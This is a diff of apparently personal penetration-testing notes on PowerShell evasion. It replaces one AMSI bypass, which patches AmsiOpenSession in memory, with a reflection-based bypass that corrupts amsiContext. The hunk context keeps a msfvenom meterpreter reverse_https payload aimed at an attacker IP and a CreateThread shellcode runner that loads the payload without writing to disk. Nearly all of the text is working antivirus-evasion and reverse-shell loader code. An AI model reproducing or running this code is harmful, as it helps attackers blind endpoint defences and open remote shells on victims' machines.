@@ -1,43 +1,11 @@
-Code For ps1 host below code on server as run.ps1, this will bypass antivirus and won't write to disk
-AMSI Bypass1 code used below:
+For ps1 host below code on server as run.ps1, this will bypass antivirus and won't write to disk
+AMSI Bypass2 code used below:
 
 Use separate staged exploit with encoding and encoder:
 
 The shell closed itself with this - not working
 
-function getDelegateType {
-
-	Param (
-		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
-		[Parameter(Position = 1)] [Type] $delType = [Void]
-	)
-
-	$type = [AppDomain]::CurrentDomain.
-    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
-    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
-      DefineDynamicModule('InMemoryModule', $false).
-      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
-      [System.MulticastDelegate])
-
-  $type.
-    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
-      SetImplementationFlags('Runtime, Managed')
-
-  $type.
-    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
-      SetImplementationFlags('Runtime, Managed')
-
-	return $type.CreateType()
-}
-
-[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
-$oldProtectionBuffer = 0
-$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
-$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
-
-$buf = [Byte[]] (0x48, 0x31, 0xC0) 
-[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
-$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
 
 
 function LookupFunc {
@@ -88,4 +56,3 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=44
 $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
 
 [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
-
